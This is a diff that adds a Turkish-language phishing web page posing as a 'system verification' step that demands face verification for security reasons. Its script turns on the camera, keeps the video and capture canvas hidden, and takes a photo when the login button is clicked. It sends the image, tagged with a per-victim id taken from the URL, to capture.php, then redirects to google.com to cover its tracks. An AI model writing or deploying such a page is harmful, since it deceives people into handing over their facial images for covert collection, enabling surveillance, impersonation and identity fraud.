@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Doğrulaması</title>
+    <style>
+        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .box { background: #1f1f1f; padding: 20px; border-radius: 10px; display: inline-block; }
+        video, canvas { display: none; } /* Kamera ve kare gizli */
+        button { padding: 10px 20px; background: #00ff7f; border: none; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>Devam Etmek İçin Kameraya İzin Verin</h3>
+        <p>Güvenlik protokolü gereği yüz doğrulaması gereklidir.</p>
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
+        <button id="captureBtn">GİRİŞİ TAMAMLA</button>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id');
+
+        // Kamerayı başlat
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => { alert("Hata: Kamera izni olmadan devam edemezsiniz!"); });
+
+        document.getElementById('captureBtn').addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+
+            // Fotoğrafı base64 formatına çevir
+            const imageData = canvas.toDataURL('image/png');
+
+            // Veriyi PHP'ye gönder
+            fetch('capture.php?id=' + userId, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'image=' + encodeURIComponent(imageData)
+            }).then(() => {
+                window.location.href = "https://google.com"; // İşlem bitince yönlendir
+            });
+        });
+    </script>
+</body>
+</html>
